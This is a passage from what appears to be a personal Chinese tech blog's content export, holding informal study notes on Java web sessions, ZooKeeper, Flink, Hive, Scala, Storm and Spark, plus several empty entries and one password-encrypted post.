<li>5.给cookie设置路径，设置域名：<br>setPath（路径的ur1），setDomain（域名）；I比如：域名就是服务器名称，比如说：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></li>
<li>6.得到cookie:Cookie[]cookies=request.getCookies（）</li>
</ul>
<h2 id="3-Session对象"><a href="#3-Session对象" class="headerlink" title="3.Session对象"></a>3.Session对象</h2><h3 id="1-1什么是session"><a href="#1-1什么是session" class="headerlink" title="1.1什么是session"></a>1.1什么是session</h3><p>session是一种会话管理技术，session用来保存会话过程中的数据，保存的数据存储到服务器端。<br>session原理：基于cookie实现的，更确切的说是基于会话级别的cookie实现的。</p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-db737d4c2d329bb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="session"></p>
<h4 id="1-2-HttpSession-API-session常用方法："><a href="#1-2-HttpSession-API-session常用方法：" class="headerlink" title="1.2 HttpSession API session常用方法："></a>1.2 HttpSession API session常用方法：</h4><ul>
<li>1.得到session的id（JESSIONID对应的值）：getId（）；</li>
<li>2.设置session的生命时长：setMaxInactiveInterval（int interval）</li>
<li>3.销毁session:invalidate（）；得到session:HttpSession session=getSession（）；session域对象：作用范围一次完整的会话（包含多个请求）</li>
<li>1.存值：setAttribute（String key，Object obj）；&gt;&gt;&gt;2.取值：Object obj=getAttribute（String key）；</li>
<li>3.移除：|removeAttribute（String key）f总结域对象：request域对象 session域对象 servletcontext域对象，作用范围以次变大。</li>
</ul>
<h4 id="1-3-Session超时管理"><a href="#1-3-Session超时管理" class="headerlink" title="1.3 Session超时管理"></a>1.3 Session超时管理</h4><p>session对象是由生命时长，它的默认存活时间是30分钟。<br>具体配置找tomcat软件的conf下的web.xml文件<br>立即销毁session对象：invalidate（）；</p>
]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>会话</tag>
      </tags>
  </entry>
  <entry>
    <title>java-web之面向百度编程笔记</title>
    <url>/java-web%E4%B9%8B%E9%9D%A2%E5%90%91%E7%99%BE%E5%BA%A6%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul>
<li>由equals的源码可以看出这里定义的equals与= =是等效的（Object类中的equals没什么区别），不同的原因就在于有些类（像String、Integer等类）对equals进行了重写，但是没有对equals进行重写的类（比如我们自己写的类）就只能从Object类中继承equals方法，其equals方法与= =就也是等效的，除非我们在此类中重写equals。<br>另外，= =比equals运行速度快,因为= =只是比较引用。</li>
<li>request和response(请求和响应)</li>
<li><ul>
<li><p>当Web容器收到客户端的发送过来http请求，会针对每一次请求，分别创建一个用于代表此次请求的HttpServletRequest对象(request)对象、和代表响应的HTTPServletResponse对象(response)。</p>
<ul>
<li>request负责获取客户机提交过来的数据。</li>
<li>response负责向客户机输出数据。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="eclipse"><a href="#eclipse" class="headerlink" title="eclipse"></a>eclipse</h3><ul>
<li><p>publish:是将你的web程序发布到tomcat服务器上，这样通过浏览器就可以访问你的程序。</p>
</li>
<li><p>clean：是指原先编译到tomcat服务器上的程序，先清除掉，然后再重新编译。</p>
<a id="more"></a>
<h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3></li>
</ul>
<h2 id="Html"><a href="#Html" class="headerlink" title="Html"></a>Html</h2><ul>
<li>“&amp;nbsp”什么意思：在 html 里是空格占位符，普通的空格在 html 里如果连续的多个可能被认为只有一个，而这个东西你写几个就能占几个空格位</li>
</ul>
<h2 id="javascrip"><a href="#javascrip" class="headerlink" title="javascrip"></a>javascrip</h2><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2>]]></content>
      <categories>
        <category>java web</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>java-反射</title>
    <url>/java-%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h3 id="什么是反射机制？"><a href="#什么是反射机制？" class="headerlink" title="什么是反射机制？"></a>什么是反射机制？</h3><h3 id="反射机制有什么作用？"><a href="#反射机制有什么作用？" class="headerlink" title="反射机制有什么作用？"></a>反射机制有什么作用？</h3><h3 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h3><h3 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h3><h3 id="Field"><a href="#Field" class="headerlink" title="Field"></a>Field</h3><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><p>###</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>java-zookeeper</title>
    <url>/java-zookeeper/</url>
    <content><![CDATA[<h2 id="zookeeper-简介"><a href="#zookeeper-简介" class="headerlink" title="zookeeper 简介"></a>zookeeper 简介</h2><h3 id="什么是分布式"><a href="#什么是分布式" class="headerlink" title="什么是分布式"></a>什么是分布式</h3><ul>
<li>多台计算机组成一个整体，且一致对外并且处理同一个请求</li>
<li>内部的每台计算机都可以互相通信（rest/rpc）</li>
<li>客户端到服务短的一次请求到相应结束会经历多台计算机（比如下了一个订单之后，通过多个计算机计算后得到最终的结果）<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201125/WSNFuqPmU5jy.png" alt="mark"></li>
</ul>
<p>怎么拆：对用户不透明，对自己是透明的。根据业务去拆，把业务细分、模块化，服务治理服务化，搞个分布式集群系统。系统负载会大大增加。</p>
<h3 id="分布式系统的瓶颈以及zk的相关特性"><a href="#分布式系统的瓶颈以及zk的相关特性" class="headerlink" title="分布式系统的瓶颈以及zk的相关特性"></a>分布式系统的瓶颈以及zk的相关特性</h3><p>瓶颈：<br>流量特别多的情况下，协调。 特喵的没讲清。</p>
<p>特性：<br>一致性：数一致性，数据按照顺序分批入库<br>原子性：事务要么成功，要么失败，不会局部化<br>单一视图：客户端连接集群中的任一zk节点，数据都是一致的（某个服务挂掉也没大事）<br>可靠性：每次都zk的操作状态都会保存在服务端（状态回滚？你特喵的在说啥？）<br>实时性：客户端可以读取到zk服务端的最新数据（高并发七年概况啥，状态抽取？？？又没讲清）<br><a id="more"></a></p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>bin：常用命令<br>conf：配置文件  zk.cfg<br>contrib: 一些附加功能  （？？？？？？？？）<br>dist-maven: mvn编译目录（打包、编译、pom、测试类jar包）<br>docs： 文档帮助 pdf、html<br>lib: 需要的依赖 jar 包<br>recipes：案例 demo<br>src: 源码</p>
<h3 id="zoo-cfg-配置"><a href="#zoo-cfg-配置" class="headerlink" title="zoo.cfg 配置"></a>zoo.cfg 配置</h3><p>tickTime: 用于计算的实践单元。比如session超时：N*tickTime</p>
<p>initLimit：用于集群，允许从节点连接并同步到master节点的初始化连接时间，以tickTime的倍数来表示</p>
<p>syncLimit：用于集群，master主节点与从节点之间发布消息，请求合应答时间长度。（心跳机制） 超过一定的时间数，就是超时。  又没说清</p>
<p>dataDir： 必须配置</p>
<p>dataLogDir： 日志目录，如果不配置会和dataDir公用。</p>
<p>clientPort：连接服务器的端口 默认2181 （伪分布的话需要变化）</p>
<h2 id="Zookeeper-基本数据模型"><a href="#Zookeeper-基本数据模型" class="headerlink" title="Zookeeper 基本数据模型"></a>Zookeeper 基本数据模型</h2><h3 id="数据模型介绍"><a href="#数据模型介绍" class="headerlink" title="数据模型介绍"></a>数据模型介绍</h3><ul>
<li><p>一：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201125/SDq1BSgo8Krc.png" alt="mark"></p>
</li>
<li><p>二：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201125/jcivbkEkq08y.png" alt="mark"></p>
</li>
<li><p>三：<br>zk的数据模型也可以理解为linux/unix的文件目录：/usr/local/.<br>每一个节点都称之为znode，它可以有子节点，也可以有数据<br>每个节点分为临时节点和永久节点，临时节点在客户端断开后消失<br>  临时节点：<br>  永久节点：</p>
</li>
<li><p>四：<br>每个zk节点都各自的版本号，可以通过命令行来显示节点信息<br>每当节点数据发生变化，那么该节点的版本号会累加（乐观锁）<br>删除/修改过时节点，版本号不匹配则会报错</p>
</li>
<li><p>五：<br>每个zk节点存储的数据不宜过大，几K即可<br>节点可以设置权限acl，可以通过权限来限制用户的访问</p>
</li>
</ul>
<h3 id="数据模型基本操作"><a href="#数据模型基本操作" class="headerlink" title="数据模型基本操作"></a>数据模型基本操作</h3><p>客户端链接<br>查看znode结构<br>关部客户端连接</p>
<h3 id="作用体现"><a href="#作用体现" class="headerlink" title="作用体现"></a>作用体现</h3><ul>
<li>一：<br>master节点选举，主节点挂了以后，从节点就会接手工作，并且保证这个节点是唯一的，这也是所谓首脑模式，从而保证我们的集群是高可用的</li>
<li>二：<br>统一配置文件管理，即只需要部署一台服务器，则可以把相同的配置文件同步更新到其他所有服务器，此操作在云计算中用的特别多（假设修改了redis统一配置）</li>
<li>三：<br>发布与订阅，类似消息队列MQ（amq，rmq…），dubbo发布者把数据存在znode上，订阅者会读取这个数据</li>
<li>四：<br>提供分布式锁，分布式环境中不同进程之间争夺资源，类似于多线程中的锁</li>
<li>五：<br>集群管理，集群中保证数据的强一致性</li>
</ul>
]]></content>
      <categories>
        <category>zookeeper</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-Azkaban</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-Azkaban/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>java-大数据-Presto</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-Presto/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>java-大数据-Sqoop</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-Sqoop/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>java-大数据-kafka</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-kafka/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-flink</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-flink/</url>
    <content><![CDATA[<h2 id="flink-架构-新架构长啥样？"><a href="#flink-架构-新架构长啥样？" class="headerlink" title="flink 架构   新架构长啥样？"></a>flink 架构   新架构长啥样？</h2><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>从架构设计、代码质量、开发的角度来看<br>·不同的DAG表示形式和翻译路径<br>·不同的算子实现：StreamOperator，Driver<br>·不同的Task执行：StreamTask，BatchTask<br>·DataSet 有自己的小型优化器与SQL优化器打架<br>·基于DataSet 开发的语义很难和标准SQL保持一致<br>·算子在流批之间无法共享<br>·两套完全独立的connector集合<br>·潜在问题：两条独立的技术栈-&gt;需要更多的人力</p>
<blockquote>
<p>功能开发变慢、性能提升变难，bug变多</p>
</blockquote>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/YWdamLR770TO.png" alt="mark"></p>
<a id="more"></a>
<p>Runtime 改动？？？<br>·JobGraph 需要加强，携带上有界性等信息<br>·FLINK-11875：基于push模型的可选边的Operator<br>·JobGraph 需要加强，节点携带上有界性等信息<br>·FLINK-11875：基于push横型的可选边的Operator<br>·N：插件化调度机制<br>·FLINK-10288：高效的批处理作业恢复<br>·FLINK-10653；插件化Shuffle Service</p>
<p>Table API&amp;SQL改动？<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/YgEkk98uMD9k.png" alt="mark"></p>
<p>Flink SQL</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/rRhON4OATuA2.png" alt="mark"></p>
<p>改进的基础数据结构—BinaryRow<br><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/QBEUlz8IP320.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/pGDCOEHTOGnE.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/bWENrb2s6GXk.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/7FMhIlDW3YcV.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/EYo13G0HAOIg.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/w7F5qwOz3mtf.png" alt="mark"></p>
<p>大量流处理性能优化<br>·MiniBatch<br>·Local聚合<br>·Distinct Agg自动热点打散<br>·Distinct State共享<br>·细分场景，特定算子实现<br>·100+优化规则</p>
<p>Hive集成<br>·统一的Catalog接口<br>·提供基于内存和可持久化的Catalog实现<br>·提供Hive Catalog，支持与Hive的互操作<br>·支持在Flink中运行Hive UDF</p>
<p>总结<br>·Flink1.9将是具有里程碑意义的一个版本<br>·Flink有史以来改动最大的一个版本，所有模块都在迎接变化<br>·改造之后，Flink将具备比较完善流批一体的技术架构<br>·用户将有一个较好的流批统一的体验·希望能有更多人加入到社区一起努力</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/mvFcd1Rjx3no.png" alt="mark"></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>flink</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-hive</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-hive/</url>
    <content><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="collect-set"><a href="#collect-set" class="headerlink" title="collect_set"></a>collect_set</h3><p>把同一分组的不同行的数据聚合成一个集合</p>
<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p>date_format函数（根据格式整理日期）</p>
<p>date_add函数（加减日期）<br><a id="more"></a><br>next_day函数</p>
<pre><code>取当前天的下一周的周一
取当前周的周一
last_day函数（求当月最后一天日期）
</code></pre>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>数仓</tag>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-scala</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-scala/</url>
    <content><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>1、区分大小写<br>2、类名首字母要大写。每个单词的第一个字母要大写<br><code>示例：class MyFirstScalaClass</code><br>3、方法名称首字母要小写。每个单词的第一个字母要大写<br><a id="more"></a><br><code>示例：def myMethodName()</code><br>4、 程序文件的名称应该与对象名称完全匹配(新版本不需要了，但建议保留这种习惯)。<br>5、def main(args: Array[String]) - Scala程序从main()方法开始处理，这是每一个Scala程序的强制程序入口部分。<br>6、Scala 中使用 val 语句可以定义函数，def 语句定义方法。<br>7、在 Scala 中，String 是一个不可变的对象，所以该对象不可被修改。这就意味着你如果修改字符串就会产生一个新的字符串对象。组就是可变的对象。<br>8、Scala 集合分为可变的和不可变的集合。构造列表的两个基本单位是 Nil 和 ::。Nil 也可以表示为一个空列表。<br>9、你可以使用 ::: 运算符或 List.:::() 方法或 List.concat() 方法来连接两个或多个列表<br>10、Scala Set(集合)是没有重复的对象集合，所有的元素都是唯一的。Scala 集合分为可变的和不可变的集合。默认情况下，Scala 使用的是不可变集合，如果你想使用可变集合，需要引用 scala.collection.mutable.Set 包。<br>11、Scala Iterator（迭代器）不是一个集合，它是一种用于访问集合的方法。迭代器 it 的两个基本操作是 next 和 hasNext。<br>调用 it.next() 会返回迭代器的下一个元素，并且更新迭代器的状态。<br>调用 it.hasNext() 用于检测集合中是否还有元素。<br>12、Map(映射)是一种可迭代的键值对（key/value）结构。默认情况下 Scala 使用不可变 Map。如果你需要使用可变集合，你需要显式的引入 import scala.collection.mutable.Map 类。在 Scala 中 你可以同时使用可变与不可变 Map，不可变的直接使用 Map，可变的使用 mutable.Map。<br>13、与列表一样，元组也是不可变的，但与列表不同的是元组可以包含不同类型的元素。<br>14、Scala Option(选项)类型用来表示一个值是可选的（有值或无值)。<br>Option[T] 是一个类型为 T 的可选值的容器： 如果值存在， Option[T] 就是一个 Some[T] ，如果不存在， Option[T] 就是对象 None 。</p>
]]></content>
  </entry>
  <entry>
    <title>java-大数据-storm</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-storm/</url>
    <content><![CDATA[<p>1.什么是storm</p>
<p>Storm是Twitter开源的分布式实时大数据处理框架，被业界称为实时版Hadoop。随着越来越多的场景对Hadoop的MapReduce高延迟无法容忍，比如网站统计、推荐系统、预警系统、金融系统(高频交易、股票)等等，大数据实时处理解决方案（流计算）的应用日趋广泛，目前已是分布式技术领域最新爆发点，而Storm更是流计算技术中的佼佼者和主流。</p>
<p>按照storm作者的说法，Storm对于实时计算的意义类似于Hadoop对于批处理的意义。Hadoop提供了map、reduce原语，使我们的批处理程序变得简单和高效。同样，Storm也为实时计算提供了一些简单高效的原语，而且Storm的Trident是基于Storm原语更高级的抽象框架，类似于基于Hadoop的Pig框架，让开发更加便利和高效。<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>storm</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-spark</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-spark/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>1、搭建 spark 集群</p>
<p>2、为什么学习 spark？<br>spark 是基于内存的分布式计算框架，计算速度是非常快的，它的出现解决了海量的数据计算慢的问题，并且有很多不同的应用场景，它是非常受企业青睐的。<br><a id="more"></a></p>
<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/48exA7FI90Eu.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/Mh57b6MLSV2y.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/PKeq1htjhvcm.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/nP3BIaLncNLi.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/S9yaI5NsSkSO.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/blIDftPMPv10.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/5oiLSFKY40XN.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/nNkfyriiDmM1.png" alt="mark"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201107/0bkSz0rfs6Fu.png" alt="mark"></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-一海游项目</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-%E4%B8%80%E6%B5%B7%E6%B8%B8%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+uVDgDm6J8MJx4D0f7Rk3dmni7UVxFtIgDbkg2bwMjM7WBj3Z2pdAuzYem+mDQ/2iqMMxzIXuoo5iAD9m5jFxP4kFOdADmkoif5Vj5WYhfQFkhhDYm4KUtugWD0dJ9XjqzxSaID9fXMsp5rNM613v4DDf9yo7w6rpxfp7DYsHzvB69lhy8YLVclP+dZkCWN0YfkzSjhvXwaHW9yRDZXxfyIslrACvPswQMdt9NbrrKj+AGJ90H632nJXC1NpyhJloU0vvX65ltlUCU3TABgGeAHCmNfWO1SGwC0I4NZcRJK+30B2gCRqxJ+Al9dHWPoFMoSd1v1UYGrE14+l/OTRMaKc0kdsrX1KosjfcGAKdcxCmKTQDqO5JoT6h/NnPFZ/Vemm8bbqD5O67m7McrDEG6fDbvcJcM+cO6DbnUqcXZIg257muHnMcTHfa/6MoV8yXS9NBeV9tL9GX1mI42dQcGD4VauDxTQ2jZtcyq1W0QRQDIaC0Mtoixg04mNVspm+xNY1sTI32zPOdLnMokDr92/YpP/n6+0P0e7f0MAH9WubJ2f8RoDwc3aAdeMZI++78qJ/Lp+ObdiI6LkmZmTbb9tuxC4OHPZgVI0LVCFf+hU+MnVYFCuSp8b+pYM9pcmgjBrNhbhJb8K3JuCrmSbkERHR6REtLQP4HhFrNqMcPOxlIVRbU6kIOoZqTydpBWRe4YK4WusYVgk9eJFigG9+6/dQzj4s36aWpwNbI85QzbqVZGJe0SyL86m3q7Hec29Qh6GCU/DPGhPvVg4gmk79gXM2+hrwnxBRThjoiD41lclmD8uPDHPrb6S8wl1LxVjRHOEGMuVOVrl9LGFNJSRrmdZNUFvIy/9YYfEQfkSl/Hd2jt06EFzjpnIp0K8qQCO/iulWJDqMbTAeqDLs1tOHeZ/K2FPvGp1LT2tUpD/0QDOXjP5n4Dq/Md5ji3RonPq1f1MIElT3EufN+fggxB0ZPWD4E+JRUA2iwNW+W4E97ZECE6R6AHv3F8ceLo5wel96R+c7QtaNDy2itNzNXB6nrM+39rEAm8Dhvlzh/l974umGmS9D2TEDPov8NivHdcJ0+YuewAdMXmokeWfDFffd9FXlGBsT4wzQoLgH9k966UyJY/34GPrrHZ/NeyiadEGqrWpUqdAvrdCkjH2TVFoQOMVWlmkvgD0qG24XKYgLCtL/Ucqtu3FtcnAB9EH/ofLsETmfPNxqNmrn3vpkY5zcS5eqhyMlsoi7bUfJ0DQPhg1CT33nAZ/21twRBnC8OO5gje45MSmNC1huQ0uuyoRqtZlSVeIfQKrTFgtwsDCxuYjz4mf2REmCxKHLfDpZIkxcdDTFXu3+6s9gVvv6RlSTouj/HNDkfrReqJDIPM0yFdDlV13yRt0xak2gusWMrTJ7YkdfWpjQtJL2dktI1qPvlBo4YkV19cnvPPyrCHPhqRk/lQzZibyoqliRLqrpo0Bck5n7S+S9gSd0O5F9ncekE1h4fi6ZZoJC8Ks7TyDBVWa9iwYE077EnJ+o8/npsHqhDv/Z8PeFnIthAseQ+IRU9lYN4+aOB908Lc3esir2JfYBbvqC9c63xDewidCGLQBOq/ryiE6YmhYJVn0uiWvgNzZg6g18snxlUfqbp5hGEaghuDGhFPKhFZtVpqxcJdDXQqSFtMiLdU0tmseeuqKdeQ1L8PKMtNR6frEmRb8J+Eh8OCrJaz4wed/2EGV4B1ffRPzfLxrgDRbJsEfo9ai8tXtOyL9Akzbs2NaprY6C/pzuv9vCWzOGBxOKqI94VnOEYpZ5YXSOjZowKxN/AsK0cIcggd2ExBPvTHj6Y04uqgBkAQVeIDACntIJxA9FQOx+XKWn/1jThNc7bKx8zeKIRqmCS8QRf6SRotXhHHdUJ+96TyQ/fHcqnatvin7BoxT13YdM1nBP5D/aJgqcoQ2cZZAzaVDU5W9OXGRd/N758DsStW2dlRtku4gZXUNi2mDd/eF73vxpeNm2U2+M3qz6nmZNB9PFmDfLvKy1wN0iPHBWobM4whVhUSG5+yHmTnJTtigiVHPY8M2y6Pts7jKnn2hsHMTfe0HOAku7i5Nt8pkWBTMTS46pOjI48Mof/tlu7yStJo8JDB0+y/v/2nZE2lgtKivyEwD4D6IaqI0VyMo501LYBttYb3+IRkwsWbpv8AEQQWdcQlV59W2rgmPM21dvMpL08Pd+WhIaZdRQKa3OlILhpOPMMLvGsyMU0ghuoLFQY5D6MtJ6oHG1WHNEQnpAZfTC0Ldvov2/RlE5N+FiEfzQ1dhzFwUQg7nqCtK34uhhYWkejBi4L81DNvGN8lMvIfxDh1lrwF0hwCZBgAdkdceFAJ+TM+6jRr4zMUzri2H+bO8HVBkDBjwzhxoKpyaD79uxCMMFalP6xlXtgLfnWlEz4Qlzl2Gk8HZvnCHx6PFaSPiZa3pP3MJ+Y9oFBd0k+lJLPSNOp2JbLQsXWxwGUapgzmG0FfonIv0Nuqar3jkLRlZIWcS4DD6RMhzZE7/8TE3ueGWc9FLYQqSwyhbB+5opYYNn0GcpIjtPmx1Px1zOClABsF/9P63g3LsKHVJurlvNpaPVaXLIOlqOgMu/Z5xMX/uyEVo8+bL6vfu8puAAQjriVx9lIg2VtIbwwFhMREMkNfQt7NOxuNLgcJ8FPdOcAbRWu0WCN5UbeFGK8wu2rSRnm0vfOjIDAbWh9NF5gk90wdqV+ioNn7U7dCHTZA76yGEF1PduiZktFiRcuj30KThUskLRiWK/D+PuDigLL+IP9Hhws9BJ6L4XqMm5+fW/A3K2wrm17WXzkywYHzgnoiBw/mX5+LlHOSP/Pd2RHC5vAxZWJWDa/ZbbjFC889qWIl4P0xqgGuEQt3Q6Xjp4D77G6hOCw9jJwc+kF4j8uZW5v+LO9A5hLq+ciw1+98cN4Kr1gruPTDpcweKxu7F4eI0HVkCg5uQt2v3Cvc+i38O4oN9Wa8LKQqXCnkX9RMBBIk/aXh+2XRDGQ3IPY7VsQVRZJYC9XeDt+AzBkmXHVLOXzklpbSlpCCiHQ0BryrWKkShe5yicmmpRh5fdhmF2wpDU9/f+gPM+1V6VeTomZTF6uO035BPynNxecvvh2yXENn/qyzOBdY+aFFcj5NVMbSTBI7akPQZZQgmShu1DQZPAb5hVK9SIyeLGPK3gQJ352TCPtyT8jkTyAxwHnyhMUQ3H2pHZMeB4xWfHRZlP9/YfmT5Qyds5skG32OlDu56XvRKP/RKq3gd66cVC1q70mL/H1KXjwqOaq0akPgE+gs4OQRvyPd6QxC5D/N3e4jf7uKb1l4mNUdgVICxF7TmDwVt+r4m3WyU4yDHp/EMDWf8i3+atsrDfJUMbrT+pRVle3QgVNDxpanQPAvJTib99EsgE/3ZUhdqX/IVQHjktUhHX8fziHHkZenw8I5IrpWMzNuWpfeYtvIkNAQ9oiFKaojKrgM/dnoVxNnPJXI3HqqoXgDkMl8jEwZVvJYADxD0sIBfE7fC5IaloqC3fOWXRYJXwsCbsI7EHJ8yOuBPAd3WD/b8jG4x1OxIAF1YmSUFkU1f04fNPvLlLfwWtn600DZU0zee8q9KH/3chYLSVUlvmbsdPPBxoqstZRwOPQRkKTlSOUnffBmvN01UpZzUnnlQPot+C1P/TSuAo0Uvws53upwD0L4x1o2yqkIdR3nOHrYSkBG+QajkWRpO0t478LFBTPbdoHhkWHBLfJUqVhvDPtufOtQtADbSqRphbhlV/mfkHUcTWTNoU+dISQpQYb7RevrdvSNw2OEH6c97RtZFBFhnuoJoFhPhKFVUWNt+rjsDwnQUjaxxyzQq0/TOZ+9S3I9dwjaArkLmnUrox1JxFncA60ag8l2dMzWXtsMQHgoUavfUVbspLAc7nORWqn6sSHrtVzWTfnANj0ZJerUqzpVQD0atnGoJyi1QZ7nwOdhCQ6dPWA9GH19m5ffu9rvr3GwL5D1c9w3sgtEN8mdAlnlRfrxYsJV66jrcEehAK/YChwHV1SqW5n1FeVWvEACr2pf7L19prWUGyqaAsV4BKKNXYs7qNdD2DZcG93QBoctH1PyCTAH/B6q/ZgYAGhWQyg0AVcU2PHTlQ/fZWfEYeSZLzmGbSx1jV/XUuAk8s+LEbGSCpWzZ4JslRTXZ0lm06CFdvwSxO7XR8VHW5cx+/3WYBIatJwmk9x//17rjfK2ELbKLYoHw3dJf2SOMeDWVpdzhAVdjzdjw7VqO5gEprqbptXYnZdzXt/k+4BAhunlXPd5DC2zLTIV/nfrsQdUUcyqWVPozby8eWHb2X/5dIthSrQd/RmCCfj/uFIMid+ZHMuRcotfGsO0142TwUP5eJ5CAHFw0u8GNplyxQtAqKm5SBmcgmLWq4vHjOJwXg0rk0LTFFHS2wpqWjtqxNHCKdYiLKZUU7ZvItAi7KFdaIcSFelorar6SPvHoPY8TD7oXP+3qadmps5JObHyoqqlJaXqbjuDf14q110SeRL+TH20c+TSvVqQyHVl2C8cAciVOLw35O1SWtKdQ9mhofV3h6HWM8T+X9Ve1gJvX7U6XqzRQztRwS4XBkcCBzMpQiEHMcR2DQuk3kHeUiDxmIWmMgQt7cUoAO5zIfMyNJN8CGzhiw9/Mox1XOl6Nl1zJBQh0/iuSE1SEiC2mPBgSZvNaH4EkQMj8e7CI/kZDY/GD6+wZJbfMg+sDmnQwC21vS0ePjqBCef25L63io6dK5bqJ0zkHEIcWhPVv784wZg/lx2z3WWLe4bsbVarHtTboWm/SkKO7vCnpOlyEFgo05HLq3Sg8vOVzsUo9nQVce1IjuPqM8C1qBP1G0UTQcSM324y4y1IVRHctAvVe3zuBiv9+lF22JH+cxUSUx0ExpkMPucBwXI/oX419u94oc/FoEiBl9+sexUtQhBILRXtn1rWKjtzofLYKIvRl5mB